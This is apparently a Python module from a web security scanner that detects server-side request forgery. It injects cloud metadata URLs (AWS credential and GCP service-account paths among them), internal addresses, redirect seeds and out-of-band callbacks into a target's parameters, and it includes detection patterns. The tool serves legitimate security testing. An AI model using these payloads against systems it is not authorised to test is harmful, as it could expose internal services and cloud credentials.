import re
import logging
from typing import Optional
from urllib.parse import urlparse

from core.finding import Finding
from scanners.base import BaseScanner
from core.oast_manager import OastManager

logger = logging.getLogger('SeaScanner.SSRF')

# SSRF Detection scanner - evidence-only (v4, SOP Phase 3.3).
#
# The scanner never classifies: it only collects raw evidence for a set of
# independent server-side request forgery techniques, each emitted as a
# confirmed observation only after repeated confirmation with a *different*
# payload:
#
#   1. metadata   - a cloud metadata service response is returned through
#                         the parameter and matches provider-specific metadata
#                         markers (AWS / Azure / GCP / DigitalOcean / OpenStack /
#                         Alibaba / Oracle). The matching provider is classified
#                         and the requested URL is stripped from the body so an
#                         app that merely echoes the URL can never satisfy a
#                         marker.
#   2. internal_access  - a request to an internal/private address yields a
#                         distinct response, reproduced on a second internal
#                         address. Only 200 responses that differ in size from
#                         baseline count (low false-positive ceiling); generic
#                         error bodies are excluded.
#   3. error_signature  - the response surfaces a URL-fetch error string
#                         (connection refused / DNS failure) that a second
#                         payload reproduces - evidence the server performed the
#                         request.
#   4. redirect_chain   - the server, given a payload URL, emits a Location that
#                         lands on an internal / cloud-metadata host. We walk the
#                         *server-side* redirect chain (each hop re-sent through
#                         the parameter) and record every hop; a hop to an
#                         internal/off-site target is the signal.
#   5. oast             - out-of-band interaction on a server-controlled domain
#                         proves the server fetched an attacker-controlled URL.
#
# Evidence correlation: provider classification across metadata + internal
# techniques aggregates a single reported cloud provider instead of claiming it
# from one signal. Confidence/severity/verification are all engine-derived and
# dynamic (evidence count, independent observations, confirmation, verification
# passes).


class SSRFScanner(BaseScanner):

    # Redirect-chain analysis bounds (each hop is a fresh server-side request).
    REDIRECT_MAX_HOPS = 4

    # Confirmed internal_access requires this size difference over baseline and a
    # 200 status - bound false positives from generic 5xx/4xx application pages.
    INTERNAL_MIN_SIZE_DIFF = 300

    # ------------------------------------------------------------------
    # Payload sets (Phase 3.3: broaden cloud + internal + protocol variety)
    # ------------------------------------------------------------------

    # Cloud metadata endpoints grouped per provider. `markers` is the vocabulary
    # that proves a real metadata listing/body was returned, and `headers` is the
    # optional request header some providers demand (GCP Metadata-Flavor).
    CLOUD_PROVIDERS = {
        'aws': {
            'label': 'AWS EC2 IMDS',
            'urls': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/instance-id',
                'http://169.254.169.254/latest/meta-data/local-ipv4',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/dynamic/instance-identity/document',
                'http://169.254.169.254/1.0/meta-data/',
            ],
            'markers': [
                'instance-id', 'ami-id', 'local-ipv4', 'local-hostname',
                'public-keys', 'reservation-id', 'availability-zone',
                'instance-identity', 'security-credentials', 'instance-type',
                'image-id', 'placement',
            ],
            'headers': {},
        },
        'azure': {
            'label': 'Azure Instance Metadata',
            'urls': [
                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'http://169.254.169.254/metadata/instance?api-version=2017-08-01',
                'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01',
            ],
            'markers': [
                'subscriptionId', 'resourceGroupId', 'vmId', 'vmName',
                'azEnvironment', 'osProfile', 'skuId', 'publisher', 'offer',
                'placementGroupId', 'compute',
            ],
            'headers': {'Metadata': 'true'},
        },
        'gcp': {
            'label': 'Google Cloud Metadata',
            'urls': [
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://metadata.google.internal/computeMetadata/v1/project/project-id',
                'http://metadata.google.internal/computeMetadata/v1/instance/',
                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
            ],
            'markers': [
                'computeMetadata', 'instanceId', 'projectId', 'numericProjectId',
                'serviceAccount', 'instance', 'project', 'oslogin',
            ],
            'headers': {'Metadata-Flavor': 'Google'},
        },
        'digitalocean': {
            'label': 'DigitalOcean Metadata',
            'urls': [
                'http://169.254.169.254/metadata/v1/',
                'http://169.254.169.254/metadata/v1/id',
                'http://169.254.169.254/metadata/v1/region',
            ],
            'markers': ['droplet', 'region', 'public_ipv4', 'user_data', 'id'],
            'headers': {},
        },
        'openstack': {
            'label': 'OpenStack / Cloud-Init Metadata',
            'urls': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/openstack/latest/meta_data.json',
                'http://169.254.169.254/openstack/latest/user_data',
            ],
            'markers': ['openstack', 'uuid', 'availability_zone', 'meta_data',
                        'cloud_name'],
            'headers': {},
        },
        'alibaba': {
            'label': 'Alibaba Cloud ECS Metadata',
            'urls': [
                'http://100.100.100.200/latest/meta-data/',
                'http://100.100.100.200/latest/meta-data/instance-id',
            ],
            'markers': ['instance-id', 'region-id', 'hostname', 'eipv4',
                        'network-interface'],
            'headers': {},
        },
        'oracle': {
            'label': 'Oracle Cloud Instance Metadata',
            'urls': [
                'http://169.254.169.254/opaque/v1/',
                'http://169.254.169.254/opaque/v1/instance/',
            ],
            'markers': ['displayName', 'compartmentId', 'availabilityDomain',
                        'image', 'canonicalRegion', 'opaque'],
            'headers': {},
        },
    }

    # Internal / private probe targets (broadened, incl. link-local + IPv4-mapped).
    INTERNAL_URLS = [
        'http://127.0.0.1/',
        'http://127.0.0.1:8080/',
        'http://127.0.0.2/',
        'http://localhost/',
        'http://0.0.0.0/',
        'http://[::1]/',
        'http://10.0.0.1/',
        'http://10.1.2.3/',
        'http://192.168.0.1/',
        'http://192.168.1.1/',
        'http://172.16.0.1/',
        'http://172.20.0.1/',
        'http://169.254.169.3/',
        'http://[::ffff:127.0.0.1]/',
        'https://127.0.0.1/',
    ]

    # Redirect seeds: pointing the app at these shows an open-proxy / internal
    # follow if the app is forgeable. Both the service redirects and single-hop
    # Location are exercised.
    REDIRECT_SEEDS = [
        'http://169.254.169.254/latest/meta-data/',
        'http://127.0.0.1/',
        'http://[::1]/',
    ]

    METADATA_PATTERNS = [
        'instance-id', 'ami-id', 'public-keys', 'security-credentials',
        'local-hostname', 'local-ipv4', 'meta-data', 'computeMetadata',
        'subscriptionId', 'vmId', 'placement',
    ]

    SSRF_ERROR_PATTERNS = [
        'Connection refused', 'Connection timed out', 'Name or service not known',
        'Failed to connect', 'NameResolutionFailure', "couldn't connect to host",
        'Connection reset', 'No route to host', 'socket.gaierror',
        'getaddrinfo failed', 'Temporary failure in name resolution',
        "can't connect", 'connection to .* failed', 'address family not supported',
        'proxyerror', 'max retries exceeded', 'new connection error',
    ]

    GENERIC_BODY_PATTERNS = [
        '404 not found', '405 method not allowed', 'bad request', 'forbidden',
        'unauthorized', 'not authorized', 'an error occurred', 'runtime error',
        'server error', 'stack trace', 'service unavailable', 'maintenance',
        'access denied', 'invalid request', 'resource not found',
        'the requested resource', 'could not be found',
    ]

    _TECHNIQUE_ORDER = {
        'oast': 0, 'metadata': 1, 'redirect_chain': 2,
        'internal_access': 3, 'error_signature': 4,
    }

    def __init__(self, target: str, session=None, post_data: dict = None,
                 oast_manager: Optional[OastManager] = None):
        super().__init__(target, session, post_data)
        self.name = "SSRF Detection"
        self.oast_manager = oast_manager
        # Per-instance payload sets (B13: no mutable class-level state). The
        # ALL_CAPS class constants are references, never mutated.
        self.cloud_providers = SSRFScanner.CLOUD_PROVIDERS
        self.internal_urls = SSRFScanner.INTERNAL_URLS
        self.redirect_seeds = SSRFScanner.REDIRECT_SEEDS
        self.metadata_patterns = SSRFScanner.METADATA_PATTERNS
        self.ssrf_error_patterns = SSRFScanner.SSRF_ERROR_PATTERNS
        self.generic_body_patterns = SSRFScanner.GENERIC_BODY_PATTERNS

    # ------------------------------------------------------------------
    # scan() - evidence-only orchestration
    # ------------------------------------------------------------------

    def scan(self) -> Finding:
        finding = Finding()
        finding.module = self.name

        try:
            params = self.get_params()
            post_keys = list((self.post_data or {}).keys())
            has_params = bool(params or post_keys)

            if not has_params:
                finding.add_evidence(
                    self._evidence_builder.verified(
                        "No URL parameters or POST data found to test for "
                        "server-side request forgery",
                        payload=None,
                    )
                )
                finding.tests_passed = 0
                return finding

            observations = []
            tests = 0
            techniques = set()

            baseline = self._get_baseline(params, post_keys)
            baseline_size = len(baseline.text) if baseline else 0

            for method, targets in (('GET', params), ('POST', post_keys)):
                if not targets:
                    continue
                for label, fn in (
                    ('metadata', self._check_metadata),
                    ('internal_access', self._check_internal),
                    ('error_signature', self._check_errors),
                    ('redirect_chain', self._check_redirect),
                ):
                    obs, tested = fn(targets, method, baseline_size)
                    tests += tested
                    for o in obs:
                        observations.append(o)
                        techniques.add(label)

            oast_obs = self._check_oast(params + post_keys)
            tests += 1
            if oast_obs:
                observations.append(oast_obs)
                techniques.add('oast')

            finding.tests_performed = tests
            finding.tests_run = tests

            observations.sort(key=lambda o: self._TECHNIQUE_ORDER.get(o['kind'], 9))

            if observations:
                providers = self._aggregate_providers(observations)
                for obs in observations:
                    self._emit_observation(finding, obs)

                if len(techniques) >= 2:
                    self._emit_cross_validation(finding, techniques, providers)

                finding.tests_passed = max(0, tests - len(observations))
                finding.fingerprint['ssrf_signals'] = [
                    {
                        'technique': o['kind'],
                        'parameter': o['param'],
                        'method': o['method'],
                        'target_url': o.get('target_url'),
                        'provider': o.get('provider'),
                    }
                    for o in observations
                ]
                if providers:
                    finding.fingerprint['cloud_provider'] = providers
                finding.add_recommendation(
                    1, "Restrict outbound traffic and validate URL inputs",
                    "Server-Side Request Forgery lets an attacker reach internal "
                    "services or cloud metadata.",
                    "Block private IP ranges (127.0.0.0/8, 10.0.0.0/8, "
                    "172.16.0.0/12, 192.168.0.0/16 and link-local 169.254.0.0/16); "
                    "use a URL allowlist; strip redirects that leave the "
                    "allowlist; enforce a strict URL scheme allowlist.",
                    ["OWASP: SSRF", "PortSwigger: Server-side request forgery"],
                )
            else:
                finding.add_evidence(
                    self._evidence_builder.verified(
                        f"No server-side request forgery detected. Tested {tests} "
                        "payloads.",
                        payload=None,
                    )
                )
                finding.tests_passed = tests

        except Exception as e:
            finding.add_evidence(
                self._evidence_builder.error(
                    f"Error during SSRF scan: {str(e)}", payload=None
                )
            )
            finding.scan_errors += 1

        return finding

    def _aggregate_providers(self, observations):
        """Combine provider classifications across techniques into the strongest
        single report. Two independent observations naming the same provider
        raise its confidence; never a bare majority claim."""
        tally = {}
        for o in observations:
            prov = o.get('provider')
            if prov:
                tally[prov] = tally.get(prov, 0) + 1
        if not tally:
            return []
        # Prefer providers corroborated by > 1 independent observation.
        best = max(tally, key=lambda k: (tally[k], k))
        if tally[best] >= 2:
            return [best]
        return [prov for prov, _ in sorted(tally.items())]

    # ------------------------------------------------------------------
    # Emission helpers
    # ------------------------------------------------------------------

    def _emit_observation(self, finding, obs):
        resp = obs.get('resp')
        payload = obs['payload']
        param = obs['param']
        method = obs['method']

        request_info = {
            'method': method,
            'url': self._request_url(param, payload, method),
            'headers': dict(self.session.headers),
            'payload': payload,
        }
        response_info = None
        if resp is not None:
            response_info = {
                'status_code': resp.status_code,
                'headers': dict(resp.headers),
                'body_length': len(resp.text),
                'body_snippet': resp.text[:300],
                'elapsed': resp.elapsed.total_seconds() if resp.elapsed else None,
            }

        if obs['kind'] == 'oast':
            ev = self._evidence_builder.verified(
                obs['desc'],
                payload=payload,
                endpoint=self.target,
                parameter=param,
                method=method,
            )
            ev.raw_data.update({
                'technique': 'oast',
                'matched_rule': obs.get('matched_rule'),
                'reliability': 'high',
                'reproducible': True,
            })
            ev.verification_pass = 3
            ev.verification_method = (
                "out-of-band interaction on attacker-controlled domain")
            finding.add_evidence(ev)
            return

        ev = self._evidence_builder.request_response(
            obs['desc'],
            request=request_info,
            response=response_info or {},
            payload=payload,
            endpoint=self.target,
            parameter=param,
            method=method,
        )
        ev.raw_data.update({
            'technique': obs['kind'],
            'matched_rule': obs.get('matched_rule'),
            'detection_method': obs.get('detection_method'),
            'target_url': obs.get('target_url'),
            'provider': obs.get('provider'),
            'reliability': obs.get('reliability', 'medium'),
            'reproducible': True,
            'confirm_payload': obs.get('confirm_payload'),
            'redirect_chain': obs.get('redirect_chain'),
        })
        ev.verification_pass = 2
        ev.verification_method = "primary + confirm payloads"
        finding.add_evidence(ev)

    def _emit_cross_validation(self, finding, techniques, providers=None):
        detail = ', '.join(sorted(techniques))
        if providers:
            detail += f" targeting {', '.join(providers)}"
        ev = self._evidence_builder.cross_validation(
            "Server-side request forgery confirmed by multiple independent "
            f"techniques ({detail})",
            payload=None,
        )
        ev.verification_pass = len(techniques)
        ev.verification_method = f"{len(techniques)} independent techniques"
        finding.add_evidence(ev)

    # ------------------------------------------------------------------
    # Technique checks
    # ------------------------------------------------------------------

    def _check_metadata(self, params, method, baseline_size):
        """A cloud metadata response is returned through the parameter and
        matches provider-specific markers, reproduced on a second payload."""
        observations = []
        tested = 0
        for param in params:
            scanned = set()
            for provider, meta in self.cloud_providers.items():
                if provider in scanned:
                    continue
                hits = []
                for url in meta['urls']:
                    tested += 1
                    resp = self._send(
                        param, url, method, timeout=10, headers=meta['headers']
                    )
                    if resp is None:
                        continue
                    classified = self._metadata_body_hit(url, resp)
                    if classified and classified[0] == provider:
                        hits.append((url, resp, classified))
                        if len(hits) >= 2:
                            break
                if len(hits) >= 2:
                    url, resp, classified = hits[0]
                    observations.append({
                        'kind': 'metadata',
                        'provider': provider,
                        'param': param,
                        'method': method,
                        'payload': url,
                        'confirm_payload': hits[1][0],
                        'target_url': url,
                        'resp': resp,
                        'detection_method': (
                            f"{meta['label']} metadata markers returned "
                            f"({classified[0]}) and reproduced on a second path"
                        ),
                        'matched_rule': (
                            f'SSRF to {meta["label"]} cloud metadata '
                            f'({provider.upper()})'
                        ),
                        'reliability': 'high',
                        'desc': (
                            f"SSRF to cloud metadata in {method} parameter "
                            f"'{param}': {url} returned {meta['label']} metadata "
                            f"(confirmed with {hits[1][0]})"
                        ),
                    })
        return observations, tested

    def _metadata_body_hit(self, url, resp):
        """Return (provider, marker) if the body carries a provider marker that
        is NOT an echo of the requested URL. An app that reflects the full URL
        back cannot satisfy this (the URL words are excluded). Returns None."""
        try:
            body = (resp.text or '').lower()
        except Exception:
            return None
        url_lower = url.lower()
        for provider, meta in self.cloud_providers.items():
            for marker in meta['markers']:
                m = marker.lower()
                if m in url_lower:
                    continue
                if m in body:
                    return provider, marker
        return None

    def _check_internal(self, params, method, baseline_size):
        """A request to an internal address yields a distinct 200 response
        differing from baseline, reproduced on a second internal address."""
        observations = []
        tested = 0
        for param in params:
            differing = []
            for url in self.internal_urls:
                tested += 1
                resp = self._send(param, url, method, timeout=10)
                if resp is None:
                    continue
                if self._differs_from_baseline(resp, baseline_size):
                    differing.append((url, resp))
                    if len(differing) >= 2:
                        break
            if len(differing) >= 2:
                url, resp = differing[0]
                provider = self._infer_provider_from_host(url)
                observations.append({
                    'kind': 'internal_access',
                    'provider': provider,
                    'param': param,
                    'method': method,
                    'payload': url,
                    'confirm_payload': differing[1][0],
                    'target_url': url,
                    'resp': resp,
                    'detection_method': (
                        f'private-address fetch returned a distinct 200 '
                        f'({len(resp.text)} bytes vs {baseline_size} baseline), '
                        f'reproduced on a second internal host'
                    ),
                    'matched_rule': (
                        'response to internal/private address differs from '
                        'baseline, reproduced on a distinct internal address'
                    ),
                    'reliability': 'medium',
                    'desc': (
                        f"SSRF to internal address in {method} parameter "
                        f"'{param}': {url} returns a distinct response "
                        f"(reproduced with {differing[1][0]})"
                    ),
                })
        return observations, tested

    def _check_errors(self, params, method, baseline_size):
        """URL-fetch error strings surface in the response, reproduced with a
        second payload - evidence the server performed the request."""
        observations = []
        tested = 0
        for param in params:
            matched = []
            probes = ['http://127.0.0.1:1/', 'http://nonexistent.invalid/',
                      'http://169.254.169.254:65535/']
            for url in probes:
                tested += 1
                resp = self._send(param, url, method, timeout=10)
                if resp is None:
                    continue
                text = resp.text.lower()
                for pattern in self.ssrf_error_patterns:
                    if re.search(pattern, text, re.IGNORECASE):
                        matched.append((url, pattern, resp))
                        break
                if len(matched) >= 2:
                    break
            if len(matched) >= 2:
                url, pattern, resp = matched[0]
                observations.append({
                    'kind': 'error_signature',
                    'param': param,
                    'method': method,
                    'payload': url,
                    'confirm_payload': matched[1][0],
                    'target_url': url,
                    'resp': resp,
                    'detection_method': (
                        f'URL-fetch error signature {pattern!r} reproduced on a '
                        'second probe target'
                    ),
                    'matched_rule': f"URL-fetch error signature {pattern!r} reproduced",
                    'reliability': 'medium',
                    'desc': (
                        f"SSRF URL-fetch error in {method} parameter '{param}': "
                        f"fetching {url} surfaced {pattern!r} (reproduced with "
                        f"{matched[1][0]})"
                    ),
                })
        return observations, tested

    def _check_redirect(self, params, method, baseline_size):
        """Walk the *server-side* redirect chain for each seed. Each hop is
        re-sent through the parameter (so the chain is produced by the target,
        not the scanner client). A hop whose Location lands on an
        internal/cloud-metadata host is the SSRF signal; the full chain is
        recorded for correlation."""
        observations = []
        tested = 0
        for param in params:
            for seed in self.redirect_seeds:
                chain, loc_target, tested0 = self._walk_server_chain(
                    param, seed, method
                )
                tested += tested0
                if not chain or loc_target is None:
                    continue
                payload = chain[0]['payload']
                observations.append({
                    'kind': 'redirect_chain',
                    'param': param,
                    'method': method,
                    'payload': payload,
                    'confirm_payload': chain[-1]['payload'],
                    'target_url': payload,
                    'resp': chain[-1].get('resp'),
                    'redirect_chain': chain,
                    'detection_method': (
                        f'server-side redirect chain ({len(chain)} hop(s)) '
                        f'landed on internal/off-site target {loc_target}'
                    ),
                    'matched_rule': (
                        f'server followed payload URL and redirected to '
                        f'{loc_target}'
                    ),
                    'reliability': 'medium',
                    'desc': (
                        f"SSRF redirect behaviour in {method} parameter "
                        f"'{param}': fetching {payload} redirected to "
                        f"{loc_target} ({len(chain)} hop(s))"
                    ),
                })
                break
        return observations, tested

    def _walk_server_chain(self, param, seed, method, max_hops=None):
        """Send `seed` through the parameter, follow the app-returned Location
        chain (re-sending each Location through the parameter), and return
        (hops, final_internal_target, tests) where hops is the ordered request
        list and final_internal_target is set when a hop targets an
        internal/cloud-metadata destination."""
        max_hops = max_hops or self.REDIRECT_MAX_HOPS
        hops = []
        current = seed
        seen = set()
        tested = 0
        for _ in range(max_hops):
            resp = self._send(param, current, method, timeout=10,
                              allow_redirects=False)
            tested += 1
            if resp is None:
                break
            location = resp.headers.get('Location', '')
            hops.append({
                'payload': current,
                'status': resp.status_code,
                'location': location,
                'resp': resp,
            })
            if location and self._is_forgeable_target(location):
                return hops, location, tested
            if not location or resp.status_code not in (301, 302, 303, 307, 308):
                break
            if current in seen:
                break
            seen.add(current)
            current = self._resolve_location(current, location)
        return hops, None, tested

    def _resolve_location(self, base_url, location):
        if location.startswith(('http://', 'https://')):
            return location
        try:
            return urlparse(location).geturl()
        except Exception:
            return location

    def _check_oast(self, params):
        if not self.oast_manager or not params:
            return None
        try:
            param = params[0]
            payload_url = self.oast_manager.generate_payload(
                0, self.name, 'oast'
            )
            if not payload_url:
                return None
            self._send(param, payload_url, 'GET', timeout=10)
            self.oast_manager.poll()
            if not self.oast_manager.check_interaction(payload_url):
                return None
            return {
                'kind': 'oast',
                'param': param,
                'method': 'GET',
                'payload': payload_url,
                'confirm_payload': payload_url,
                'target_url': payload_url,
                'resp': None,
                'detection_method': 'out-of-band HTTP interaction',
                'matched_rule': ('out-of-band HTTP interaction on '
                                 'attacker-controlled service domain'),
                'reliability': 'high',
                'desc': (
                    f"SSRF confirmed via out-of-band interaction for parameter "
                    f"'{param}': {payload_url} received a connection"
                ),
            }
        except Exception:
            return None

    def _infer_provider_from_host(self, url):
        host = (urlparse(url).hostname or '').lower()
        if host == '169.254.169.254':
            return None
        if 'google.internal' in host:
            return 'gcp'
        return None

    # ------------------------------------------------------------------
    # Internal / FP-guard helpers
    # ------------------------------------------------------------------

    def _is_any_hop_internal(self, chain):
        return any(h.get('location') and self._is_internal_target(h['location'])
                   for h in chain)

    def _is_forgeable_target(self, location):
        low = (location or '').lower()
        if any(h in low for h in (
            '169.254.169.254', 'metadata.google.internal', '100.100.100.200',
        )):
            return True
        return self._is_internal_target(low)

    def _is_internal_target(self, host_or_url):
        low = (host_or_url or '').lower()
        internal_hints = (
            '169.254.', '127.', 'localhost', '0.0.0.0', '[::1]',
            '::1', '10.', '192.168.', '172.16.', '172.17.',
            '172.31.', 'metadata', '100.100.100.200', '10.0.0.',
        )
        return any(h in low for h in internal_hints)

    def _is_generic_response(self, resp):
        try:
            body = (resp.text or '').lower()
            if len(body) < 40:
                return False
            return any(p in body for p in self.generic_body_patterns)
        except Exception:
            return False

    def _differs_from_baseline(self, resp, baseline_size):
        if resp is None or baseline_size <= 0:
            return False
        if self._is_generic_response(resp):
            return False
        if resp.status_code != 200:
            return False
        size_diff = abs(len(resp.text) - baseline_size)
        return size_diff > self.INTERNAL_MIN_SIZE_DIFF

    # ------------------------------------------------------------------
    # Request helpers
    # ------------------------------------------------------------------

    def _get_baseline(self, params, post_keys):
        try:
            resp = self.session.get(self.target, timeout=10)
            return resp if resp is not None else None
        except Exception:
            return None

    def _send(self, param, payload, method, timeout=10, allow_redirects=False,
              headers=None):
        """SSRF probes never auto-follow redirects by default: a target that
        returns a Location to an internal/off-site host must not cause the
        scanner's client to follow it (open-redirect driven me away + latency).
        The redirect-chain technique controls each hop explicitly."""
        try:
            merged = dict(self.session.headers)
            if headers:
                merged.update(headers)
            if method == 'GET':
                return self.session.get(
                    self.inject_payload(param, payload), timeout=timeout,
                    allow_redirects=allow_redirects, headers=merged)
            data = self.post_data.copy()
            data[param] = payload
            return self.session.post(
                self.target, data=data, timeout=timeout,
                allow_redirects=allow_redirects, headers=merged)
        except Exception:
            return None

    def _request_url(self, param, payload, method):
        if method == 'GET':
            return self.inject_payload(param, payload)
        return self.target